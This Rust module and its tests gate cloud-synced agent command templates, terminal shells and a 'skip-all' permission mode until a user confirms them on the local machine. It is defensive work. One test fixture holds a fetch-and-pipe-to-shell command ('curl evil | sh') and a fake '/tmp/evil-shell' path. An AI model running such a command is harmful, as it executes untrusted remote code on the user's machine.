//! Per-machine trust for the synced settings that decide what RUNS here:
//! each agent's command template (`agent_commands`), the terminal shell
//! (`terminal_shell`), and a default permission mode of `skip-all`
//! (`default_permission_mode`).
//!
//! All sync through the cloud, so a value can arrive from another machine
//! (or a compromised account) and would then take effect here on the next
//! task launch / terminal open — a synced `skip-all` would make every new
//! task here launch with `--dangerously-skip-permissions`. Like run
//! commands, such a value is used only once it is trusted on THIS machine —
//! typed here, or confirmed here — keyed by (setting, exact text) in
//! `app_meta` (`AppMetaRepo::trust_scoped`). Until then launches fall back
//! to the agent's default template, the account's login shell, and the
//! default (asking) permission mode.

use std::collections::BTreeMap;

use serde::Serialize;

use crate::domain::{PermissionMode, UserSettings};
use crate::store::{AppMetaRepo, SettingsRepo, StoreError};

const TERMINAL_SHELL_SCOPE: &str = "terminal_shell";
const PERMISSION_MODE_SCOPE: &str = "default_permission_mode";
/// Set once the values present when this feature first ran were trusted.
const GRANDFATHERED_KEY: &str = "settings_trust_grandfathered";

fn agent_scope(agent_key: &str) -> String {
    format!("agent_command:{agent_key}")
}

/// A synced setting not yet trusted on this machine, as the "Allow on this
/// Mac" banner shows it: the frontend's field name and the value that
/// would take effect.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct UnconfirmedSetting {
    /// `agentCommands.<agent>` | `terminalShell` | `defaultPermissionMode`.
    pub key: String,
    pub value: String,
}

/// `(key, scope, text)` for every gated value set in `settings`. Keys are
/// the frontend's field names (`agentCommands.claude`, `terminalShell`,
/// `defaultPermissionMode`).
///
/// Only the LEAST safe permission mode is gated: `ask-edits` / `ask-shell`
/// both stop before running shell commands, so a synced one can't do here
/// what the user didn't agree to; `skip-all` can.
fn gated_values(settings: &UserSettings) -> Vec<(String, String, String)> {
    let mut out: Vec<(String, String, String)> = settings
        .agent_commands
        .iter()
        .filter(|(_, template)| !template.trim().is_empty())
        .map(|(key, template)| (format!("agentCommands.{key}"), agent_scope(key), template.clone()))
        .collect();
    if !settings.terminal_shell.trim().is_empty() {
        out.push((
            "terminalShell".into(),
            TERMINAL_SHELL_SCOPE.into(),
            settings.terminal_shell.clone(),
        ));
    }
    if settings.default_permission_mode == PermissionMode::SkipAll {
        out.push((
            "defaultPermissionMode".into(),
            PERMISSION_MODE_SCOPE.into(),
            PermissionMode::SkipAll.as_str().into(),
        ));
    }
    out
}

/// The gated values NOT trusted on this machine, with their values.
pub async fn unconfirmed(meta: &AppMetaRepo, settings: &UserSettings) -> Result<Vec<UnconfirmedSetting>, StoreError> {
    let mut out = Vec::new();
    for (key, scope, value) in gated_values(settings) {
        if !meta.is_trusted_scoped(&scope, &value).await? {
            out.push(UnconfirmedSetting { key, value });
        }
    }
    Ok(out)
}

/// "Allow on this Mac" for the given `keys` only, each at its CURRENT
/// value (a value that changed since the banner showed it is trusted as it
/// is now — the banner re-reads after every sync). Unknown keys and keys
/// already trusted are ignored. Returns the keys that were confirmed.
pub async fn confirm_keys(
    meta: &AppMetaRepo,
    settings: &UserSettings,
    keys: &[String],
) -> Result<Vec<String>, StoreError> {
    let mut confirmed = Vec::new();
    for (key, scope, value) in gated_values(settings) {
        if keys.contains(&key) && !meta.is_trusted_scoped(&scope, &value).await? {
            meta.trust_scoped(&scope, &value).await?;
            confirmed.push(key);
        }
    }
    Ok(confirmed)
}

/// Trust every current gated value (the one-time grandfathering pass).
/// Returns the keys that were unconfirmed.
pub async fn confirm_all(meta: &AppMetaRepo, settings: &UserSettings) -> Result<Vec<String>, StoreError> {
    let keys: Vec<String> = gated_values(settings).into_iter().map(|(key, _, _)| key).collect();
    confirm_keys(meta, settings, &keys).await
}

/// A save from this machine: trust the values that CHANGED from `before`
/// (the user typed them here). Unchanged values keep their status — the
/// settings page re-sends the whole object on every toggle, which must not
/// silently confirm a synced value it merely loaded.
pub async fn trust_edits(meta: &AppMetaRepo, before: &UserSettings, after: &UserSettings) -> Result<(), StoreError> {
    let old: Vec<(String, String)> = gated_values(before)
        .into_iter()
        .map(|(_, scope, text)| (scope, text))
        .collect();
    for (_, scope, text) in gated_values(after) {
        if !old.iter().any(|(s, t)| *s == scope && t.trim() == text.trim()) {
            meta.trust_scoped(&scope, &text).await?;
        }
    }
    Ok(())
}

/// `settings` with every untrusted gated value replaced by its default (no
/// override / login shell / the default permission mode) — what launches
/// actually use.
pub async fn usable(meta: &AppMetaRepo, mut settings: UserSettings) -> UserSettings {
    let mut kept = BTreeMap::new();
    for (key, template) in std::mem::take(&mut settings.agent_commands) {
        // Unknown = untrusted: never run a value on a failed lookup.
        if template.trim().is_empty() || meta.is_trusted_scoped(&agent_scope(&key), &template).await.unwrap_or(false) {
            kept.insert(key, template);
        }
    }
    settings.agent_commands = kept;
    if !settings.terminal_shell.trim().is_empty()
        && !meta
            .is_trusted_scoped(TERMINAL_SHELL_SCOPE, &settings.terminal_shell)
            .await
            .unwrap_or(false)
    {
        settings.terminal_shell = String::new();
    }
    if settings.default_permission_mode == PermissionMode::SkipAll
        && !meta
            .is_trusted_scoped(PERMISSION_MODE_SCOPE, PermissionMode::SkipAll.as_str())
            .await
            .unwrap_or(false)
    {
        settings.default_permission_mode = PermissionMode::default();
    }
    settings
}

/// The user's settings as a LAUNCH may use them (`usable`).
pub async fn launch_settings(settings: &SettingsRepo, meta: &AppMetaRepo) -> Result<UserSettings, StoreError> {
    Ok(usable(meta, settings.get_or_init().await?).await)
}

/// One-time, at the first launch of a build with this check: trust what is
/// already stored. Those values were running on this machine before (no
/// build ever gated them), so gating them now would only break the user's
/// own templates; everything that arrives or changes afterwards is gated.
pub async fn grandfather_existing(meta: &AppMetaRepo, settings: &SettingsRepo) {
    match meta.get(GRANDFATHERED_KEY).await {
        Ok(Some(_)) => return,
        Ok(None) => {}
        Err(err) => {
            eprintln!("settings trust: app_meta unreadable: {err}");
            return;
        }
    }
    let Ok(current) = settings.get_or_default().await else {
        return;
    };
    if confirm_all(meta, &current).await.is_ok() {
        let _ = meta.set(GRANDFATHERED_KEY, &chrono::Utc::now().to_rfc3339()).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::init_pool;

    async fn meta() -> (AppMetaRepo, SettingsRepo, tempfile::TempDir) {
        let dir = tempfile::tempdir().unwrap();
        let pool = init_pool(&dir.path().join("t.sqlite")).await.unwrap();
        (AppMetaRepo::new(pool.clone()), SettingsRepo::new(pool), dir)
    }

    fn with(claude: &str, shell: &str) -> UserSettings {
        let mut s = UserSettings::default();
        s.agent_commands.insert("claude".into(), claude.into());
        s.terminal_shell = shell.into();
        s
    }

    fn keys(items: &[UnconfirmedSetting]) -> Vec<&str> {
        items.iter().map(|i| i.key.as_str()).collect()
    }

    /// New #7: a synced `skip-all` default isn't used until confirmed here;
    /// the asking modes need no confirmation.
    #[tokio::test]
    async fn a_synced_skip_all_default_needs_confirmation_on_this_machine() {
        let (meta, _settings, _dir) = meta().await;
        let mut synced = UserSettings::default();
        synced.default_permission_mode = PermissionMode::SkipAll;
        assert_eq!(
            unconfirmed(&meta, &synced).await.unwrap(),
            vec![UnconfirmedSetting {
                key: "defaultPermissionMode".into(),
                value: "skip-all".into()
            }]
        );
        assert_eq!(usable(&meta, synced.clone()).await.default_permission_mode, PermissionMode::AskShell);
        for safe in [PermissionMode::AskEdits, PermissionMode::AskShell] {
            let mut s = UserSettings::default();
            s.default_permission_mode = safe;
            assert!(unconfirmed(&meta, &s).await.unwrap().is_empty());
            assert_eq!(usable(&meta, s).await.default_permission_mode, safe);
        }
        // Chosen HERE (changed from what was stored): trusted.
        trust_edits(&meta, &UserSettings::default(), &synced).await.unwrap();
        assert!(unconfirmed(&meta, &synced).await.unwrap().is_empty());
        assert_eq!(usable(&meta, synced).await.default_permission_mode, PermissionMode::SkipAll);
    }

    /// The banner trusts items one by one, each at its current value.
    #[tokio::test]
    async fn settings_are_confirmed_one_key_at_a_time() {
        let (meta, _settings, _dir) = meta().await;
        let mut synced = with("claude --x {{permissions}}", "/bin/fish");
        synced.default_permission_mode = PermissionMode::SkipAll;
        let pending = unconfirmed(&meta, &synced).await.unwrap();
        assert_eq!(keys(&pending), vec!["agentCommands.claude", "terminalShell", "defaultPermissionMode"]);
        assert_eq!(pending[1].value, "/bin/fish", "the banner can show the value");
        let json = serde_json::to_value(&pending[0]).unwrap();
        assert_eq!(json, serde_json::json!({ "key": "agentCommands.claude", "value": "claude --x {{permissions}}" }));

        let done = confirm_keys(&meta, &synced, &["terminalShell".into(), "nonsense".into()]).await.unwrap();
        assert_eq!(done, vec!["terminalShell".to_string()]);
        assert_eq!(keys(&unconfirmed(&meta, &synced).await.unwrap()), vec!["agentCommands.claude", "defaultPermissionMode"]);
        let used = usable(&meta, synced.clone()).await;
        assert_eq!(used.terminal_shell, "/bin/fish");
        assert!(used.agent_commands.is_empty(), "still unconfirmed");
        assert_eq!(used.default_permission_mode, PermissionMode::AskShell);
        // A value that changes after confirmation needs confirming again.
        synced.terminal_shell = "/tmp/other-shell".into();
        assert!(keys(&unconfirmed(&meta, &synced).await.unwrap()).contains(&"terminalShell"));
        // Confirming again is a no-op for already-trusted keys.
        assert!(confirm_keys(&meta, &synced, &["agentCommands.claude".into()]).await.unwrap().len() == 1);
        assert!(confirm_keys(&meta, &synced, &["agentCommands.claude".into()]).await.unwrap().is_empty());
    }

    /// A synced value is not used until confirmed here; a value typed here
    /// is; re-saving the page without touching a synced value doesn't
    /// confirm it.
    #[tokio::test]
    async fn synced_command_settings_need_confirmation_on_this_machine() {
        let (meta, _settings, _dir) = meta().await;
        let synced = with("curl evil | sh; claude {{permissions}}", "/tmp/evil-shell");
        assert_eq!(
            keys(&unconfirmed(&meta, &synced).await.unwrap()),
            vec!["agentCommands.claude", "terminalShell"]
        );
        let used = usable(&meta, synced.clone()).await;
        assert!(used.agent_commands.is_empty(), "falls back to the default template");
        assert_eq!(used.terminal_shell, "", "falls back to the login shell");

        // The user toggles something else: the whole object is re-saved.
        trust_edits(&meta, &synced, &synced).await.unwrap();
        assert_eq!(unconfirmed(&meta, &synced).await.unwrap().len(), 2);

        // They edit the template here: that value is trusted.
        let edited = with("claude --verbose {{permissions}}", "/tmp/evil-shell");
        trust_edits(&meta, &synced, &edited).await.unwrap();
        assert_eq!(keys(&unconfirmed(&meta, &edited).await.unwrap()), vec!["terminalShell"]);
        assert_eq!(usable(&meta, edited.clone()).await.agent_commands.len(), 1);

        // Explicit confirmation trusts the rest.
        assert_eq!(confirm_all(&meta, &edited).await.unwrap(), vec!["terminalShell".to_string()]);
        assert_eq!(usable(&meta, edited).await.terminal_shell, "/tmp/evil-shell");
    }

    #[tokio::test]
    async fn values_already_present_are_grandfathered_once() {
        let (meta, settings, _dir) = meta().await;
        let mut current = settings.get_or_init().await.unwrap();
        current.agent_commands.insert("claude".into(), "claude --mine {{permissions}}".into());
        settings.update(&current).await.unwrap();
        grandfather_existing(&meta, &settings).await;
        assert!(unconfirmed(&meta, &current).await.unwrap().is_empty());
        // Later arrivals are gated (the one-time pass doesn't run again).
        current.terminal_shell = "/bin/fish".into();
        settings.update(&current).await.unwrap();
        grandfather_existing(&meta, &settings).await;
        assert_eq!(keys(&unconfirmed(&meta, &current).await.unwrap()), vec!["terminalShell"]);
    }
}
